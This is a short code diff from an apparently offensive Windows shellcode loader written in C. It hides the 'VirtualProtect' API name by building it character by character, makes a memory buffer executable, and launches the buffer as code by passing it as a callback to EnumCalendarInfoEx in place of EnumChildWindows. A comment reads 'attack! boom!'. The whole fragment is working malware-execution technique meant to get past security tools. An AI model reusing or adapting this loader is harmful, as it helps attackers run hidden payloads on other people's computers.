@@ -224,7 +224,8 @@ int main(int argc, char *argv[])
                 const char virtProt[15] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
                 pMVP = GetProcAddress(k32_handle, virtProt);
                 rv = pMVP(mem, 0x100000, PAGE_EXECUTE_READ, &oldprotect);
-                EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
+                // attack! boom! we like planning events! :)
+                EnumCalendarInfoEx((CALINFO_ENUMPROCEX)mem, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
                 CloseHandle(mem);
 
                 return 0;
